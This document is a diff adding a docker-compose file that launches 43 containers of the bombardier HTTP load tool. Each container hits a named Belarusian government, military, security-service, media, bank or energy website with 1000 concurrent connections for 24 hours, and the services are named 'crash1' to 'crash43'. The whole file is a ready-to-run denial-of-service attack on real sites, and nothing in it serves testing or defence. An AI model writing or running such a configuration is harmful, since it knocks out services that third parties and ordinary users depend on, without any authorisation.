@@ -1,0 +1,131 @@
+version: "3.9"
+services:
+  crash1:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h http://belta.by"
+  crash2:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://sputnik.by"
+  crash3:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.tvr.by"
+  crash4:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.sb.by"
+  crash5:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://belmarket.by"
+  crash6:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.belarus.by"
+  crash7:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://belarus24.by"
+  crash8:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://ont.by"
+  crash9:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.024.by"
+  crash10:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.belnovosti.by"
+  crash11:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://mogilevnews.by"
+  crash12:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.mil.by"
+  crash13:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://yandex.by"
+  crash14:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.slonves.by"
+  crash15:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h http://www.ctv.by"
+  crash16:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://radiobelarus.by"
+  crash17:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://radiusfm.by"
+  crash18:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://alfaradio.by"
+  crash19:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://radiomir.by"
+  crash20:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://radiostalica.by"
+  crash21:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://radiobrestfm.by"
+  crash22:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.tvrmogilev.by"
+  crash23:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://minsknews.by"
+  crash24:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://zarya.by"
+  crash25:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://grodnonews.by"
+  crash26:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://rec.gov.by/ru"
+  crash27:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://mil.by"
+  crash28:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://government.by"
+  crash29:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://president.gov.by/ru"
+  crash30:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.mvd.gov.by/ru"
+  crash31:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h http://www.kgb.by/ru"
+  crash32:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://prokuratura.gov.by"
+  crash33:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h http://www.nbrb.by"
+  crash34:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://belarusbank.by"
+  crash35:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://brrb.by"
+  crash36:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.belapb.by"
+  crash37:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://bankdabrabyt.by"
+  crash38:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://belinvestbank.by/individual"
+  crash39:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://bgp.by/ru"
+  crash40:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.belneftekhim.by"
+  crash41:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h http://www.bellegprom.by"
+  crash42:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h https://www.energo.by"
+  crash43:
+    image: alpine/bombardier
+    command: "-c 1000 -t 2s -l -d 24h http://belres.by/ru"
